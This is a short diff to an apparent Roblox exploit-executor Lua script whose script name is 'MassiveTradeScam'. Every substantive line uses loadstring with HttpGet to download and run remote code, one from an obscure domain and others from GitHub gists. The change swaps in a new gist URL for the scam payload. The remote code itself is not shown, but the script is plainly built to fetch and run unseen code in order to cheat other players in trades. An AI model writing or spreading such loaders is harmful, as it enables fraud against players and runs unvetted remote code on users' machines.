@@ -2,4 +2,4 @@ getgenv().gui = false
 loadstring(game:HttpGet("https://egorikusa.space/d6517041b773743a22f398e6.lua", true))()
 
 _G.scriptName = "MassiveTradeScam"
-loadstring(game:HttpGet("https://gist.githubusercontent.com/XScriptsOfficial/8c6117f940e53caa0e5c5be3b1d58d76/raw/f77d5a609df2a0816dca6db9084057471494dbfe/Massive"))()
+loadstring(game:HttpGet("https://gist.githubusercontent.com/XScriptsOfficial/5fde217583c12ec77240d6f8fd69951a/raw/64d4beb26c8594971ca2693722d92b7339c062b2/MassiveTradeScam"))()
